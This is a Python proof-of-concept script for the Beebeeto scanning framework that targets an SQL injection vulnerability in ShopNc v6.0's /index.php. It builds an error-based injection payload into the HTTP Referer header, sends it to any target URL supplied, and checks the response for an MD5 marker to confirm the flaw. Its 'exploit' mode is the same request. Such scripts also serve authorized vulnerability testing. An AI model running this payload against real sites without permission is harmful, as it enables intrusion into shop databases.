#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2


from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0007',
            'name': 'ShopNc v6.0 /index.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2015-01-14',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ShopNc',
            'vul_version': ['6.0'],
            'type': 'SQL Injection',
            'tag': ['ShopNc漏洞', 'ShopNcSQL注入漏洞', '/index.php', 'php'],
            'desc': '''
                    Site footer:
                        ShopNC®*******科技有限公司
                        Copyright© 2007-2009 ShopNC, Powered by ShopNC Team
                    ''',
            'references': ['http://0day5.com/archives/1218',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        fake_headers = ForgeHeaders().get_headers()
        fake_headers['Referer'] = ("http://baidu.com'and(select 1 from(select count(*),concat("
                                   "floor(rand(0)*2),0x3a,(select(select(SELECT md5(233333)))"
                                   "from information_schema.tables limit 0,1))x from information_schema"
                                   ".tables group by x)a) and 1=1)#")
        verify_url = args['options']['target']
        req = urllib2.Request(verify_url, headers=fake_headers)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fb0b32aeafac4591c7ae6d5e58308344' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['headers_referer'] = fake_headers['Referer']
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())